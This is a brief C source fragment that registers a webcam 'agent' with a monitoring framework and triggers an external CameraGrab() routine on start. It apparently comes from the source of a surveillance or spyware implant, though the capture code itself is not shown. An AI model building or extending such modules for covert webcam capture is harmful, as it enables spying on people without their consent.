
extern void CameraGrab();

DWORD __stdcall PM_WebCamStartStop(BOOL bStartFlag, BOOL bReset)
{
	if (bStartFlag && bReset) 
		CameraGrab();

	return 1;
}

DWORD __stdcall PM_WebCamInit(BYTE *conf_ptr, BOOL bStartFlag)
{
	PM_WebCamStartStop(bStartFlag, TRUE);
	return 1;
}

void PM_WebCamRegister()
{
	AM_MonitorRegister(PM_WEBCAMAGENT, NULL, (BYTE *)PM_WebCamStartStop, (BYTE *)PM_WebCamInit, NULL);
}